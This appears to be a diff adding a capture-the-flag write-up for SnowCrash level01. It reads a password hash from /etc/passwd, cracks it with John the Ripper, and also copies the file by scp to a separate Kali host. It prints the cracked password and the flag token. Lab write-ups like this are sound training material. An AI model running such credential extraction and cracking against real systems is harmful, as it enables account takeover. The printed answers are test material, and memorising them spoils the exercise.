@@ -1,0 +1,125 @@
+level01@SnowCrash:~$ cat /etc/passwd | grep flag01
+flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
+
+a) 
+How to install John The Ripper on a Mac,  Pre-compiled version
+https://download.openwall.net/pub/projects/john/contrib/macosx/
+
+```
+➜  run ./john /Users/apearl/Desktop/SNOW-CRASH/Answer/snow-crash/level01/password
+Warning: detected hash type "descrypt", but the string is also recognized as "descrypt-opencl"
+Use the "--format=descrypt-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (descrypt, traditional crypt(3) [DES 256/256 AVX2-16])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+abcdefg          (?)
+1g 0:00:00:00 DONE 2/3 (2021-05-09 16:40) 25.00g/s 409600p/s 409600c/s 409600C/s 123456..betabeta
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+b)
+brew install john-jumbo
+
+```
+➜  Ressources git:(master) ✗ john --show password
+?:abcdefg
+
+1 password hash cracked, 0 left
+```
+
+level01@SnowCrash:~$ su flag01
+Password:
+Don't forget to launch getflag !
+flag01@SnowCrash:~$ getflag
+Check flag.Here is your token : f2av5il02puano7naaf6adaaf
+flag01@SnowCrash:~$
+
+flag01@SnowCrash:~$ su level02
+Password:
+level02@SnowCrash:~$
+
+
+
+=== alternative solution with kali ===
+```
+level01@SnowCrash:~$ grep -R flag01 /etc/ 2>/dev/null
+/etc/group:flag:x:1001:flag00,flag01,flag02,flag03,flag04,flag05,flag06,flag07,flag08,flag09,flag10,flag11,flag12,flag13,flag14
+/etc/group:flag01:x:3001:
+/etc/passwd:flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
+level01@SnowCrash:~$ grep ^flag01 /etc/passwd > /tmp/passwd
+level01@SnowCrash:~$ ls
+level01@SnowCrash:~$ cat /tmp/passwd
+flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
+level01@SnowCrash:~$ scp /tmp/passwd kali@kali:flag01pass
+ssh: Could not resolve hostname kali: Temporary failure in name resolution
+lost connection
+level01@SnowCrash:~$ scp /tmp/passwd kali@192.168.56.102:flag01pass
+Could not create directory '/home/user/level01/.ssh'.
+The authenticity of host '192.168.56.102 (192.168.56.102)' can't be established.
+ECDSA key fingerprint is f1:d0:a5:8f:2c:7d:75:96:b3:af:b4:25:44:83:69:85.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/user/level01/.ssh/known_hosts).
+kali@192.168.56.102's password:
+passwd                                        100%   60     0.1KB/s   00:00
+level01@SnowCrash:~$ su flag01
+Password:
+Don't forget to launch getflag !
+flag01@SnowCrash:~$ getflag
+Check flag.Here is your token : f2av5il02puano7naaf6adaaf
+flag01@SnowCrash:~$ su level02
+Password:
+level02@SnowCrash:~$
+```
+**** kali **** 
+
+permitted by applicable law.
+┏━(Message from Kali developers)
+┃
+┃ We have kept /usr/bin/python pointing to Python 2 for backwards
+┃ compatibility. Learn how to change this and avoid this message:
+┃ ⇒ https://www.kali.org/docs/general-use/python3-transition/
+┃
+┗━(Run “touch ~/.hushlogin” to hide this message)
+┌──(kali㉿kali)-[~]
+└─$
+
+┌──(kali㉿kali)-[~]
+└─$ ls
+Desktop    Downloads   Music     Public     Videos
+Documents  flag01pass  Pictures  Templates
+
+┌──(kali㉿kali)-[~]
+└─$ cat flag01pass
+flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
+
+┌──(kali㉿kali)-[~]
+└─$ john flag01pass
+Created directory: /home/kali/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (descrypt, traditional crypt(3) [DES 256/256 AVX2])
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Warning: Only 130 candidates buffered for the current salt, minimum 512 needed for performance.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+abcdefg          (flag01)
+1g 0:00:00:00 DONE 2/3 (2021-05-11 10:50) 20.00g/s 179280p/s 179280c/s 179280C/s 123456..nutmegs
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+┌──(kali㉿kali)-[~]
+└─$ john --wordlist=/usr/share/john/password.lst flag01pass
+Using default input encoding: UTF-8
+Loaded 1 password hash (descrypt, traditional crypt(3) [DES 256/256 AVX2])
+No password hashes left to crack (see FAQ)
+
+┌──(kali㉿kali)-[~]
+└─$ john --show flag01pass
+flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash
+
+1 password hash cracked, 0 left
+
+****
